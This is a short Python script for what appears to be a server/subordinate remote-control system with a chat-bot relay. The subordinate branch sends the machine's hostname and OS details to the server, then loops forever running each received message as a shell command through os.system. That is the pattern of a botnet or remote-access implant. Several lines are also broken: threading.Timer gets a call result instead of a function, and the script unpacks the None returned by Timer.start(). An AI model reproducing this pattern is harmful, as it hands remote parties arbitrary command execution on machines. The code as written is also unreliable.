from Server.configs import ROLE, MAIN_USER_ID
from Server.main import bot
from Server.twm import TellWithMe as SeTWM
from Subord.twm import TellWithMe as SuTWM
import threading, os, subprocess, socket, platform

if ROLE == "Server":
    twm = SeTWM()
    subprocess.Popen(["python3", "Server/main.py"])
    checkMail = threading.Timer(3.5, twm.receive())
    while True:
        receive, flag = checkMail.start()
        bot.send_message(MAIN_USER_ID, f"Flag:{flag}, Receive:{str(receive)}")
        
        
         
else:
    twm = SuTWM()
    twm.send(twm.compileCommand("IND", {"name": socket.gethostname(), "os": platform.platform()}), "0.0.0", "IND", "Hi Server! Can you give me an address?")
    checkMail = threading.Timer(3.5, twm.receive())
    while True:
        receive, flag = checkMail.start()
        os.system(receive)